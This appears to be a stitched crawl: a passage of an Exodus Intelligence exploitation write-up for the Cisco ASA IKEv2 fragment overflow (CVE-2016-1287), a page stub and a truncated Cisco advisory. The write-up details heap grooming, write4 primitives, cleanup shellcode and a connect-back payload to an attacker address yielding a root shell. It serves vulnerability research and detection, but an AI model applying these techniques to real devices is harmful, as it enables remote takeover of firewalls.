* The fragment is assumed to be at least as large as the fragment header, 8 bytes.
* The total length of the queue only accounts for the payload size, i.e., the header length is subtracted from each fragment before updating the queue’s size for reassembly.

An understanding of the above issues is useful when examining the reassembly for the fragments. The code for reassembly is large, but a relevant snippet from *ikev2\_reassemble\_pkt()* is illustrated in Figure 3 for discussion.

[![ikev2_reassemble_pkt() from lina 9.2.4](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_reassemble_pkt.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_reassemble_pkt.png)

Figure 3: *ikev2\_reassemble\_pkt()* from lina 9.2.4

The call to *my\_malloc()* is passed the queue length plus a header size. There are several ways to attack this code. The most basic way to attack this code is to create a reassembly queue where one of the fragments has a length less than the default fragment header size of 8 bytes, which underflows the copy length during reassembly. This small value allows the length check (signed) in *ikev2\_add\_rcv\_frag()* to be passed and the copy length to be larger (underflowed) than the allocated buffer size of: reassembly queue length + 8 in *ikev2\_reassemble\_pkt().*

## 4. Exploitation

After having successfully crafted fragments with length less than 8, the corruption happens during the fragments reassembly. However, the corruption cannot be used as-is beyond a DoS due to the negative copy (access violation). Several steps are discussed below to use the vulnerability to obtain remote code execution.

#### Crafting Small Fragments

Crafting small fragments (length < 8) can be accomplished by padding the fragment with valid information past where the fragment should end.  For example, even though a fragment of length 1 should not have a size or sequence number, these fields still need valid values. Other fields that are not checked can be padded with random values.

#### Avoiding the Negative Copy

In order to get remote code execution the negative copy should be avoided. In the interest of brevity we’ll explain the logic and exploitation of it without including the relevant disassembly. Fragments are queued by fragment ID and reassembled using sequence number. All fragments other than the last fragment should have the same size. The following pieces of program logic can be abused to send a sequence of fragments to avoid the negative copy.

1. When processing a fragment with a fragment ID different than the previous ones, the previous ones are cleared from the reassembly queue and the new one is added, but the previous fragment size is not cleared (reinitialization flaw);
2. Fragments with a sequence number of 0 can be added to reassembly queues without having their payloads processed, because the reassembly starts with sequence number 1, but their sizes are still included in the total reassembly size calculation (logic flaw);
3. Multiple fragments with the last fragment bit can be added to a reassembly queue by using the check for sequence number 0 (logic flaw); and
4. Fragments with sequence numbers after a gap in the sequence numbers will not have their payloads processed, but their sizes are still included in the total reassembly size calculation (input validation flaw).

Given the above, the following sequence of fragments can be sent to avoid the negative copy.

* Fragment with ID Y, last fragment bit not set, and size N is sent to set the previous size even though this fragment will be cleared from the queue
* Fragment with ID Z, sequence number 0, size 1, and last fragment bit set is sent to clear previous fragment
* Fragment with ID Z, sequence number 3, size 1, and last fragment bit set
* Fragment with ID Z, sequence number 1, size N, and the last fragment bit clear is sent

The above sequence yields the reassembly queue where fragments with sequence numbers 0 and 3 are not reassembled, but each result in -7 being added to the reassembly queue length. Fragment with sequence number 1 is the only one that will be reassembled and N – 8 bytes will be copied from the payload, thus avoiding the negative copy.

#### Cisco Heap Layout

Some insight of the Cisco heap layout is needed in order to decide what can be achieved with the current memory corruption. The Cisco ASA heap is based on a Doug Lea *malloc()* implementation. The Cisco heap appends a header and a footer to the classic dlmalloc chunk. The headers and footers add extra information for memory integrity and debugging/troubleshooting purposes. An allocated chunk layout is described below.

(gdb) x/70wx 0xccedf970 – 0x28

0xccedf948: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d0

0xccedf958: 0x00000000 0x00000000 0xccedf818 0xccedfa88

0xccedf968: 0x0875ba64 0xe10deaf4 0x41414141 0x41414141

0xccedf978: 0x41414141 0x41414141 0x41414141 0x41414141

0xccedfa28: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xccedfa28: 0x41414141 0x41414141 0x41414141 0x41414141

0xccedfa38: 0x41414141 0x41414141 0xa11ccdef 0xb2ea5e5b

The first 0x28 bytes (in green) are part of the heap header, the 2 last dwords (in blue) belong to the heap footer. The relevant header’s fields from an exploitation perspective are:

* offset 0x00: Header magic
* offset 0x04: Size to next block + 3 bits extra information (bit 1: previous block in use / bit 2: Current block in use)
* offset 0x08: 2nd header magic
* offset 0x0c: Size of chunk data
* offset 0x18: “prev” pointer to linked list of allocated chunk of the same size
* offset 0x1C: “next” pointer to linked list of allocated chunk of the same size

A freed chunk layout is as follows:

(gdb) x/70wx 0xccedf970 – 0x28

0xccedf948: 0xe100d4d0 0x00000101 0xccedf948 0xccedf948

0xccedf958: 0x00000000 0x00000000 0xc8000134 0x00000000

0xccedf968: 0xf3ee0123 0x0877e5bf 0x41414141 0x41414141

0xccedf978: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xccedfa28: 0x41414141 0x41414141 0x41414141 0x41414141

0xccedfa38: 0x41414141 0x41414141 0x5ee33210 0xf3eecdef

Similarly, a freed chunk layout is described below.

* offset 0x00: Header magic
* offset 0x04: Size to next block + 3 bits extra information (bit 1: previous block in use / bit 2: Current block in use)
* offset 0x08: “prev” pointer to linked list of freed chunks of the same size
* offset 0x0C: “next” pointer to linked list of freed chunks of the same size
* offset 0x18: “prev” pointer to linked list of allocated chunk of the same size
* offset 0x1C: “next” pointer to linked list of allocated chunk of the same size

The vulnerable block of size 0xd3 (size used for our exploit, which will make sense later in this post) allocated in the *ikev2\_get\_assembled\_pkt()* looks as follows:

(gdb) x/70wx 0xcbf3d1a8 – 0x28

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xcbf3d2b8 0xc80005e4

0xcbf3d1a0: 0x08767b39 0x0877dddc 0x000000cb 0x41414141

0xcbf3d1b0: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xcbf3d260: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d270: 0x41414141 0x41414141 0xef000000 0x00a11ccd

With the Cisco layout in mind, let’s look at what is located behind the vulnerable chunk:

(gdb) x/70wx 0xcbf3d1a8 – 0x28

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xcbf3d2b8 0xc80005e4

0xcbf3d1a0: 0x08767b39 0x0877dddc 0x000000cb 0x41414141

0xcbf3d1b0: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xcbf3d260: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d270: 0x41414141 0x41414141 0xef000000 0x00a11ccd

0xcbf3d280: 0xe100d4d0 0x00000031 // adjacent chunk header’s first two dwords.

The first dword of the vulnerable chunk’s data (in red) is reserved for the total size (0xcb) of the fragment data being copied. The last 2 dwords are respectively the header magic and the chunk size of the adjacent 0x30 bytes freed chunk. With a copy of 0xd3 bytes, the fields in red will be corrupted:

(gdb) x/70wx 0xcbf3d1a8 – 0x28

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xcbf3d2b8 0xc80005e4

0xcbf3d1a0: 0x08767b39 0x0877dddc 0x000000cb 0x41414141

0xcbf3d1b0: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xcbf3d260: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d270: 0x41414141 0x41414141 0xef000000 0x00a11ccd

0xcbf3d280: 0xe100d4d0 0x00000031

In the end, the magic from the next chunk’s heap header is corrupted, and eventually 1 byte of the next chunk size field can be corrupted. This means that given a correctly crafted heap layout, it is possible to insert a chunk into a freelist reserved for bigger chunks. The attacker can then claim this chunk with another packet and completely corrupt memory overlapped by the fake bigger chunk as will be explained below.

#### Crafting the Heap

In order to be able to achieve interesting things, the attacker has to set the heap in a predictable layout. For that, the *ikev2\_parse\_config\_payload()* function has been used. This function is reached when IKEv2 packets are sent with a Configuration Payload (type 47). The layout of these packets is illustrated in Figure 4.

[![ike config payload](https://blog.exodusintel.com/wp-content/uploads/2016/01/ike-config-payload-300x157.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ike-config-payload.png)

Figure 4: IKEv2 config payload packet

The IKE v2 Configuration Payload field descriptions are as follows:

* CFG Type (1 octet) – The type of exchange represented by the Configuration Attributes.
* RESERVED (3 octets)
* Configuration Attributes (variable length)

The Configuration Attributes field is of variable length and allows specifying multiple attributes. The Configuration Attributes are illustrated in Figure 5.

[![IKEv2 Configuration Attributes](https://blog.exodusintel.com/wp-content/uploads/2016/01/IKEv2-Configuration-Attributes-300x119.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/IKEv2-Configuration-Attributes.png)

Figure 5: IKEv2 Configuration Attributes

The IKEv2 Configuration Attributes field descriptions are as follows:

* Reserved (1 bit) ⋄ Attribute Type (15 bits) – A unique identifier for each of the Configuration Attribute Types.
* Length (2 octets) – Length in octets of value.
* Value (0 or more octets) – The variable-length value of this Configuration Attribute

This will allow the attacker to allocate chunks of arbitrary size with controlled content as after analysing *ikev2\_parse\_config\_payload()* in Figure 6.

[![Figure 6: ikev2_parse_config_payload()](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_parse_config_payload.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_parse_config_payload.png)

Figure 6: *ikev2\_parse\_config\_payload()* lina 9.2.4

This controlled allocation will allow de-fragmenting the heap and achieving the following heap layout below:

[![Figure 7:](https://blog.exodusintel.com/wp-content/uploads/2016/01/1.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/1.png)

A Configuration Attributes List packet is sent to the router in order to de-fragment the heap, and get further allocations to be contiguous to one another. A fragment of size 0x100 bytes is then sent. Each time the IKEv2 daemon receives a packet it will allocate 0x100 bytes to handle the packet data. This means that a 0x100 bytes chunk will be allocated as below:

[![Figure 8:](https://blog.exodusintel.com/wp-content/uploads/2016/01/2.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/2.png)

The fragment of 0x100 bytes will then be allocated next to it:

[![3](https://blog.exodusintel.com/wp-content/uploads/2016/01/3.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/3.png)

After the packet is processed, the first 0x100 byte block is freed since its of not in use any longer, leaving a hole between the de-fragmented heap and the 0x100 bytes attacker fragment:

[![4](https://blog.exodusintel.com/wp-content/uploads/2016/01/4.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/4.png)

The last fragment of size -7 (with effective size being 0x108 bytes) triggering the overflow is then sent. A 0x100 bytes chunk is allocated to handle the packet, retrieving the 0x100 bytes chunk that has been previously freed:

[![5](https://blog.exodusintel.com/wp-content/uploads/2016/01/5.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/5.png)

Since the actual packet data is bigger than 0x100, a chunk of size 0x300 is allocated in order to contain all the UDP fragment data, ending freeing the previously allocated 0x100 bytes chunk. The heap then looks as follows:

[![6](https://blog.exodusintel.com/wp-content/uploads/2016/01/6.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/6.png)

A 0x100 bytes hole is then located right before the attacker controlled fragment. *ikev2\_get\_assembled\_pkt()* will then allocate the vulnerable chunk of 0xd3 size. A chunk of size 0xd0 (because some footer data are used to contain the extra 3 bytes) is returned. Since the heap is de-fragmented, no free chunk is available to handle the request. The 0x100 bytes free block is then split into two block of 0xd0 and 0x30, giving the following heap layout:

[![7](https://blog.exodusintel.com/wp-content/uploads/2016/01/7.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/7.png)

The vulnerable *my\_memcpy()* call is then reached and ends up corrupting the “size” field of the adjacent 0x30 bytes free chunk. Arbitrary adjacent chunk “size” field corruption has been achieved.

The corrupted freed 0x30 bytes chunk of the previous sections now looks as follows:

0xcbf3d280: 0xe100d4d0 0x00000061 0xc9109b08 0xc800005c

0xcbf3d290: 0xf3ee0123 0x00000000 0x00000000 0x00000000

0xcbf3d2a0: 0x00000000 0x00000000 0x5ee33210 0xf3eecdef

Note the size field (red) is now 0x61 instead of 0x31. The heap manager will now look for the next chunk, not 0x30 bytes further, but 0x60 bytes (0x61 means 0x60 byte size + previous chunk in use bit set), ending up looking into the attacker’s fragment data. Since the fragment’s data is controlled, a fake heap chunk can be crafted. The 0x60 bytes freed chunk now encompasses a part of the attacker’s fragment chunk’s heap header. The fake heap metadata of the next chunk, just shrinks the size of the fragment to 0x100 bytes to conserve the heap integrity and allow the heap manager to locate the chunk adjacent to the fragment. The heap will then look as follows:

(gdb) x/100wx 0xcbf3d1a8 – 0x28

// Vulnerable chunk

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xc8000134 0x00000000

0xcbf3d1a0: 0xf3ee0123 0x0877cbcb 0x000000cb 0x41414141

…snip…

0xcbf3d270: 0x41414141 0x41414141 0x10000000 0x005ee332

// 0x60 bytes fake chunk

0xcbf3d280: 0xe100d4d0 0x00000061 0xc9109b08 0xc800005c

0xcbf3d290: 0xf3ee0123 0x00000000 0x00000000 0x00000000

0xcbf3d2a0: 0x00000000 0x00000000 0x5ee33210 0xf3eecdef

0xcbf3d2b0: 0x00000030 0x00000132 0xa11c0123 0x00000100

0xcbf3d2c0: 0x00000000 0x00000000 0xcbf3d088 0xc80005e4

0xcbf3d2d0: 0x08768ca9 0x41414141 0x00010000 0xf3eecdef

// Fake header in attacker’s fragment’s data

0xcbf3d2e0: 0x00000160 0x00000102 0xa11c0123 0x000000e0

0xcbf3d2f0: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d300: 0x41414141 0x41414141 0x41414141 0x41414141

The copy loop in  *ikev2\_get\_assembled\_pkt()* is exited due to not finding fragment sequence number 2 and the vulnerable 0xd0 sized heap chunk is freed later in the same function. The allocator will look for freed chunks before and after the vulnerable chunk in order to perform forward and backward coalescing. If the “size” field of the 0x30 bytes chunk wasn’t tampered with, the allocator would have backward coalesced the 0xd0 chunk with the 0x30 bytes chunk leading to the insertion of a 0x100 bytes chunk into the freelist. However since the “size” field is set to 0x60 bytes, a fake chunk of 0x130 bytes will be inserted into the freelist. The fake 0x130 bytes chunk will encompass the beginning of the adjacent 0x100 bytes block controlled by the attacker.

#### Getting Control

The attacker can now reallocate this block by sending a Configuration Attributes List packet with a bunch of Configuration Attributes of size 0x130. The 0x130 byte chunk will eventually be retrieved, corrupting the header of the attacker’s 0x100 bytes fragment chunk. As explained in the Cisco Heap Layout section, the heap header contains prev and next pointers of previous and next free chunk, whose integrity is not enforced because of the lack of safe-unlinking code. This means that an arbitrary write4 primitive can be achieved during the coalescing of the corrupted chunk. This write4 primitive will be triggered by the attacker at any time by sending a fragment with a different size. When this happens, *ikev2\_add\_rcv\_frag()* is entered and proceeds to free fragments in the linked list. The corrupted fragment will eventually be freed, triggering the write4 memory corruption. One prerequisite for the write4 technique to work is that both prev and next pointers points to writeable data. This means it is not possible to overwrite a function pointers with an address to some .text section to bootstrap a ROP chain. Fortunately the whole memory is executable and there is no ASLR.

The targeted function pointer is the pointer used to add a fragment to the linked list, which will be called right after the write4 corruption to add the new fragment in the linked list inside *ikev2\_add\_rcv\_frag().*The execution flow can then be redirected to an arbitrary writable address in memory. The problem here is the lack of knowledge of the location of attacker’s controlled data at a specific address. To get around this problem, a 2nd write4 corruption will be used during the vulnerable chunk liberation. This is done by targeting other linked list pointers present in the heap header, which are used to keep track of allocated blocks of the same size. The 2nd write4 corruption will be used to craft a fake ROP gadget in memory. The following values were chosen as prev and next pointers for the 2nd write4 corruption: 0xc8002000 and 0xc821ff90 This means that during the 2nd write4 corruption the value 0xc821ff90 will be copied at address 0xc8002000. This address will eventually translate into useful bytecode (nop; jmp dword ptr[ecx]).

The attacker now has a gadget at a known location in writeable memory. The pointers used in the 1st write4 corruption are then set so as to overwrite the targeted function pointer with the address 0xc8002000 containing the ROP gadget. When the control flow is redirected, the program will land at address 0xc8002000 and execute the jmp [ecx] instruction. As can be seen in code snippet above, the ECX register holds a pointer to the newly allocated fragment containing data controlled by the attacker. Arbitrary code execution has been achieved.

#### Cleanup

Since the Cisco router reboots if the lina process crashes, the heap has to be fixed in order to be able to get a reverse shell back to the attacker. In order to fix the memory, pointers from the context object located in a local stack variable, pointing to the option list linked list, are followed. By following the next pointer of the linked list and checking some values, it is possible to locate the 0x130 byte chunk used to perform the memory corruption. When it’s located its header is set to 0xd0 and the adjacent 0x60 size field is set back to 0x30 bytes. The following is our process continuation shellcode.

0xccc54fc1: mov DWORD PTR [edx],0x9b96790 ; fix corrupted function pointer

0xccc54fc7: mov eax,DWORD PTR [ebp-0x8] ; retrieve structure in stack

0xccc54fca: mov eax,DWORD PTR [eax+0x5c]

0xccc54fcd: mov eax,DWORD PTR [eax+0x4]

0xccc54fd0: mov eax,DWORD PTR [eax+0x8]

0xccc54fd3: mov eax,DWORD PTR [eax+0x4]

0xccc54fd6: mov eax,DWORD PTR [eax] ; go to the “next” linked list element

0xccc54fd8: test eax,eax

0xccc54fda: je 0xccc55017

0xccc54fdc: push eax

0xccc54fdd: mov eax,DWORD PTR [eax+0x8] ; follow some more pointers

0xccc54fe0: mov eax,DWORD PTR [eax+0x4]

0xccc54fe3: lea ebx,[eax+0xd8] ; set ebx to the beginning of the corrupted chunk

0xccc54fe9: pop eax

0xccc54fea: cmp DWORD PTR [ebx],0xe100d4d0 ; ensure we are have the right chunk

0xccc54ff0: jne 0xccc54fd6

0xccc54ff2: cmp DWORD PTR [ebx+0x4],0x31 ; Another check

0xccc54ff6: je 0xccc54fd6

0xccc54ff8: mov eax,ebx

0xccc54ffa: sub eax,0x100 ; Point eax to the beginning of the vulnerable chunk

0xccc54fff: mov DWORD PTR [eax+0x4],0x103 ; Fix heap metadata

0xccc55006: mov DWORD PTR [eax+0xc],0xd0

0xccc5500d: mov DWORD PTR [eax+0xf8],0xa11ccdef

The shellcode fixes the corrupted pointer used to take control of the execution flow. Then it retrieves a local variable which holds pointers to the linked list of Configuration Attributes. By following the linked list and enforcing specific values, the shellcode is able to locate the corrupted chunk in memory, and fix its heap metadata to prevent the process from crashing when the chunk is later freed. Then the real payload is executed which will be addressed in the next section.

#### Cisco ASA Shellcode

It’s necessary to use several functions of the lina binary to get a reverse shell or Cisco CLI. It is not possible to use a classic connect-back shellcode because the only network device available is the tap device. The lina binary is responsible for the handling of TCP, UDP, e.g connections, acting as a kind of user-land network driver. Cisco uses the “channel” terminology to handle network connections. Since the shellcodes are too big for this post only the general behaviour will be explained here.

Since the IKEv2 Daemon is actually a thread of the lina process, the shellcode starts by spawning a new thread for the Cisco CLI by calling *process\_create()* and allows the IKEv2 daemon to continue to do its job. Then the daemon allocates a TCP channel connecting back to the attacker’s IP address/port by calling *alloc\_ch():*

push eax ; Points to string “tcp/CONNECT/3/1.2.3.4/4444”

mov eax, 0x80707f0 ; call alloc\_ch()

call eax

The shellcode then sets the channel as responsible for the I/O on stdin/stdout/stderr:

; Set channel as in/out channel for ci/console

mov esi, 0xffffefc8

mov eax, dword ptr gs:[esi]

mov dword ptr [eax + 0x98], ebx ; Points to allocated channel

Then, a structure responsible for the user privileges is allocated, and its privileges are set to 15 (maximum cisco privileges):

mov eax, 0x080F0A80 ; Initialize privileges structure given as parameter

call eax

; Retrieve struct

pop ebx

; Give me full privileges and a cool ‘#’ prompt

mov dword ptr [ebx + 0xc], 0x17ffffff ; Give full privileges

add ebx, 0x14

; Set “enable\_15” username

mov dword ptr [ebx], 0x62616e65

mov dword ptr [ebx + 4], 0x315f656c

mov dword ptr [ebx + 0x8], 0x00000035

Finally the shellcode proceeds to call the *ci\_cons\_shell()* in order to spawn the Cisco CLI back to the attacker’s computer:

push 0x4

push 0x0a52c160 ; some function

mov eax, 0x080F6820 ; ci\_cons\_shell

call eax

Which gives the following result:

Type help or ‘?’ for a list of available commands.

ciscoasa# show running-config enable

show running-config enable

enable password 8Ry2YjIyt7RRXU24 encrypted

ciscoasa#

The reverse shell is trickier to get and ironically probably not as useful as the Cisco CLI. It then enables a hidden SOCKSv5 proxy in the lina process, by calling a function which has been dubbed *start\_loopback\_proxy()*. It is now possible to use classic sockets by connecting to the local SOCKSv5 and telling it to connect-back to the attacker computer. Since the SOCKSv5 protocol is not really complicated this is easily done in assembly. The shellcode then proceeds as a classic connect-back shellcode, by dup2()ing the socket with stdin/stdout/stderr and execve()ing “/bin/sh”:

/bin/sh: can’t access tty; job control turned off

# id

uid=0(root) gid=0(root)

## 5. Detection

Looking for the value of the length field of a Fragment Payload (type 132) IKEv2 or IKEv1 packet allows detecting an exploitation attempt. Any length field with a value < 8 must be considered as an attempt to exploit the vulnerability. The detection also has to deal with the fact that the multiple payloads can be chained inside an IKEv2 packet, and that the Fragment Payload may not be the only/first payload of the packet.

![](https://blog.exodusintel.com/wp-content/uploads/2018/10/exodus-final-logo-1_small.png)

## Intelligence

* [Zero-Day](https://www.exodusintel.com/zeroday.html)
* [N-Day](https://www.exodusintel.com/nday.html)
* [Training](https://www.exodusintel.com/training.html)

## Support

* [Resources](https://www.exodusintel.com/resources.html)
* [Blog](https://blog.exodusintel.com/)
* [FAQ](https://www.exodusintel.com/faq.html)

## Company

* [Why Exodus?](https://www.exodusintel.com/whyexodus.html)
* [About](https://www.exodusintel.com/about.html)
* [Careers](https://www.exodusintel.com/careers.html)

Copyright 2021 Exodus Intelligence



=== Content from packetstormsecurity.com_91b61e63_20250125_200500.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from tools.cisco.com_0b467a95_20250125_200502.html ===


[Home](https://www.cisco.com)  / [Cisco Security](/security/center/home.x) / [Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x)

|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| | Cisco Security AdvisoryCisco ASA Software IKEv1 and IKEv2 Buffer Overflow Vulnerability Critical   Advisory ID:  cisco-sa-20160210-asa-ike  First Published: 2016 February 10 16:00 GMT  Last Updated:  2016 May 18 13:50 GMT  Version 1.3:  [Final](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#final)   Workarounds:  No workarounds available  Cisco Bug IDs: [CSCux29978](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCux29978)  [CSCux42019](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCux42019)     CVE-2016-1287     CWE-119       CVSS Score: [Base 10.0, Temporal 8.3](https://sec.cloudapps.cisco.com/security/center/cvssCalculator.x?version=2.0&vector=AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C)**Click Icon to Copy Verbose Score** AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C       CVE-2016-1287     CWE-119       Email      Summary  * A vulnerability in the Internet Key Exchange (IKE) version 1 (v1)   and IKE version 2 (v2) code of Cisco ASA Software could allow an unauthenticated,   remote attacker to cause a reload of the affected system or to remotely   execute code.  Affected Products  * Affected Cisco ASA Software running on the following products may be affected by this vulnerability:   + Cisco ASA 5500 Series Adaptive Security Appliances   + Cisco ASA 5500-X Series Next-Generation Firewalls   + Cisco ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers   + Cisco ASA 1000V Cloud Firewall   + Cisco Adaptive Security Virtual Appliance (ASAv)   + Cisco Firepower 9300 ASA Security Module   + Cisco ISA 3000 Industrial Security Appliance   Refer to the "Fixed Software" section of this security advisory for more information about the affected releases.   Vulnerable ProductsCisco ASA Software is affected by this vulnerability if the system is configured to terminate IKEv1 or IKEv2 VPN connections or if configured as an Easy VPN hardware client.      **Cisco ASA Software configured to terminate IKEv1 or IKEv2 VPN Connections**      Cisco ASA Software is affected by this vulnerability if the system is configured to terminate IKEv1 or IKEv2 VPN connections. This includes the following:   + LAN-to-LAN IPsec VPN   + Remote access VPN using the IPsec VPN client   + Layer 2 Tunneling Protocol (L2TP)-over-IPsec VPN connections   + IKEv2 AnyConnectCisco ASA Software is not affected by this vulnerability if the system is configured to terminate only the following VPN connections:   + Clientless SSL   + AnyConnect SSLTo determine whether the Cisco ASA is configured to terminate IKEv1 or IKEv2 VPN   connections, a crypto map must be configured for at least one   interface. Administrators should use the **show running-config crypto map | include interface** command and verify that it returns output. The following example shows a crypto map called *outside\_map* configured on the *outside* interface: ```   ciscoasa# show running-config crypto map | include interface   crypto map outside_map interface outside   ``` **Note:** Due to a misconfiguration or to a partial configuration, the IKEv1 or IKEv2 process may still accept incoming IKE messages even if a crypto map is not configured. Administrators who do not have a crypto map configured should also check that IKEv1 or IKEv2 is disabled on the affected system.       To verify that IKEv1 is enabled, use the following commands and verify that the command returns output:   + **show running-config crypto ikev1 | include enable** command for Cisco ASA Software releases 8.4 and later   + **show running-config crypto isakmp | include enable** command for Cisco ASA Software releases between 7.2.1 and 8.4   + **show running-config | include isakmp enable** command for Cisco ASA Software releases prior to 7.2.1To verify that IKEv2 is enabled, use the **show running-config crypto ikev2 | include enable** and verify that it returns output.      **Cisco ASA Software Configured as Easy VPN Hardware Client**      Cisco ASA Software is affected by this vulnerability if the system is configured as an Easy VPN hardware client.      To verify that the system is configured as Easy VPN hardware client, use the **show running-config vpnclient | include enable** and verify that it returns output. The following example shows Cisco ASA configured as an Easy VPN hardware client:    ```   ciscoasa# show running-config vpnclient | include enablevpnclient enable    ```    **Note:** To exploit this vulnerability on Cisco ASA Software configured as an Easy VPN hardware client, an attacker must force the Cisco ASA to connect to a malicious VPN server.      Products Confirmed Not VulnerableNo other Cisco products are currently known to be affected by this vulnerability.  Indicators of Compromise  * Cisco IPS Signatures 7169-0 and 7169-1 and Snort SIDs 36903 and 37674 can detect attempts to exploit this vulnerability.  Workarounds  * There are no workarounds that address this vulnerability.  Fixed Software  * Cisco has released free software updates that address the vulnerability described in this advisory. Customers may only install and expect support for software versions and feature sets for which they have purchased a license. By installing, downloading, accessing, or otherwise using such software upgrades, customers agree to follow the terms of the Cisco software license:   <http://www.cisco.com/en/US/docs/general/warranty/English/EU1KEN_.html>   Additionally, customers may only download software for which they have a valid license, procured from Cisco directly, or through a Cisco authorized reseller or partner. In most cases this will be a maintenance upgrade to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.      When considering software upgrades, customers are advised to consult the Cisco Security Advisories and Responses archive at <http://www.cisco.com/go/psirt> and review subsequent advisories to determine exposure and a complete upgrade solution.      In all cases, customers should ensure that the devices to upgrade contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.      **Customers Without Service Contracts**      Customers who purchase directly from Cisco but do not hold a Cisco service contract and customers who make purchases through third-party vendors but are unsuccessful in obtaining fixed software through their point of sale should obtain upgrades by contacting the Cisco Technical Assistance Center (TAC):   <http://www.cisco.com/en/US/support/tsd_cisco_worldwide_contacts.html>      Customers should have the product serial number available and be prepared to provide the URL of this advisory as evidence of entitlement to a free upgrade.      **Fixed Releases**      In the following table, the left column lists major releases of Cisco   ASA Software. The right column indicates whether a major release is   affected by the vulnerability described in this advisory and the first release that includes the fix for this vulnerability.      | **Cisco ASA Major Release** | **First Fixed Release** |   | --- | --- |   | 7.21 | Affected; migrate to 9.1(6.11) or later |   | 8.01 | Affected; migrate to 9.1(6.11) or later |   | 8.11 | Affected; migrate to 9.1(6.11) or later |   | 8.21 | 8.2(5.59)2 |   | 8.31 | Affected; migrate to 9.1(6.11) or later |   | 8.4 | 8.4(7.30) or later |   | 8.51 | Not affected |   | 8.61 | Affected; migrate to 9.1(6.11) or later |   | 8.7 | 8.7(1.18) or later |   | 9.0 | 9.0(4.38) or later |   | 9.1 | 9.1(6.11) or later |   | 9.2 | 9.2(4.5) or later |   | 9.3 | 9.3(3.7) or later |   | 9.4 | 9.4(2.4) or later |   | 9.5 | 9.5(2.2) or later |         1Cisco ASA Software releases 7.2, 8.0, 8.1, 8.2, 8.3, 8.5, and 8.6 have reached End of Software Maintenance. Customers should migrate to a supported release.   2Cisco ASA Software release 8.2 reached End of Software Maintenance on October 21, 2015. To protect our customers still using the End of Support train 8.2 software, the Cisco ASA product team has made available an off-cycle release to address this issue. As Cisco has no plans for additional off-cycle updates to train 8.2, we recommend customers work with their relevant support organization to migrate to supported software.         *Software Download*         Cisco ASA Software can be downloaded from the Software Center on Cisco.com by visiting <http://www.cisco.com/cisco/software/navigator.html>.      For Cisco ASA 5500 Series Adaptive Security Appliances and Cisco ASA   5500-X Series Next-Generation Firewall, navigate to the following path. To find   interim versions, click **All Releases > Interim** on the left side of the download page. **Products > Security > Firewalls > Adaptive   Security Appliances (ASA) > ASA 5500-X Series Firewalls >  > Software on Chassis > Adaptive Security   Appliance (ASA) Software** For the Cisco ASA Services Module for Cisco Catalyst 6500 Series   Switches and Cisco 7600 Series Routers, navigate to the following path.   To find interim versions, click **All Releases > Interim** on the left side of the download page. **Products > Cisco Interfaces and Modules   > Services Modules > Catalyst 6500 Series / 7600 Series ASA   Services Module > Adaptive Security Appliance (ASA) Software** For the Cisco ASA 1000V Cloud Firewall, navigate to the following path: **Products > Security > Firewalls > Adaptive Security Appliances (ASA) > ASA 1000V Cloud Firewall** For the Cisco Adaptive Security Virtual Appliance (ASAv), navigate to the following path: **Products > Security > Firewalls >   Adaptive Security 